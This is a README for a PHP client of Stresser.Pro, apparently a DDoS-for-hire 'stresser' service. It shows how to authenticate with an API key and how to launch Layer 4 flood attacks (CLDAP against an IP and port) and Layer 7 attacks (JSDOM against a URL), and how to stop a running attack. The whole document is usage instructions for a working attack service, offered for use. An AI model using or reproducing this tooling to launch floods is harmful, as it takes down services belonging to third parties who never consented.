# Stresser.Pro API
Sample API usage of Stresser.Pro

## Requirements
PHP version 5.x (+).<br/>
Libcurl package.

## L4/L7 Methods Syntaxe
Available here : https://Stresser.Pro/support

## Authentication
```php
require 'API.php';
// UserID and API Key generated from API Manager website.
$userID = "12";
$apiKey = "ABCD-123";
$api = new API($userID, $apiKey);
```

## Layer 4 Attack
```php

$host = "1.1.1.1";
$port = "80";
$time = 15;
$method = "CLDAP";

/* Parameters : IPv4 , Port , Time , Method */
$response = $api->startL4($host, $port, $time, $method);
```
## Layer 7 Attack
```php

$host = "https://example.com/";
$time = "15";
$method = "JSDOM";

/* Parameters : URL , Time , Method */
$response = $api->startL7($host, $time, $method);
```
## Stop Attack
```php
/* Parameters : Stopper. */
$response = $api->stopAttack("5435289");
```

## API Response
```php
echo $response; // Get API response.
```